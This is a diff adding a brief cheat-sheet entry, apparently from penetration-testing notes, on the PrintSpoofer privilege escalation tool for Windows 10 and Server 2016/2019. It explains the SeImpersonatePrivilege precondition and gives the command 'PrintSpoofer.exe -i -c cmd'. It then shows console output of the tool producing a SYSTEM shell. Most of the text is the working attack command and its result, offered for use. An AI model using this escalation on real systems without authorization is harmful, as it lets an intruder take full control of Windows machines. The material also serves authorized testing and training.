@@ -1,0 +1,23 @@
+Windows
+https://github.com/dievus/printspoofer
+
+PrintSpoofer exploit that can be used to escalate service user permissions on Windows Server 2016, Server 2019, and Windows 10.
+From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.
+
+check 
+> whoami /priv to see if SeImpersonate Tokens are enabled.
+To escalate privileges, the service account must have SeImpersonate privileges. To execute:
+PrintSpoofer.exe -i -c cmd
+With appropriate privileges this should grant system user shell access.
+
+C:\TOOLS>PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.19613.1000]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+nt authority\system
+
+
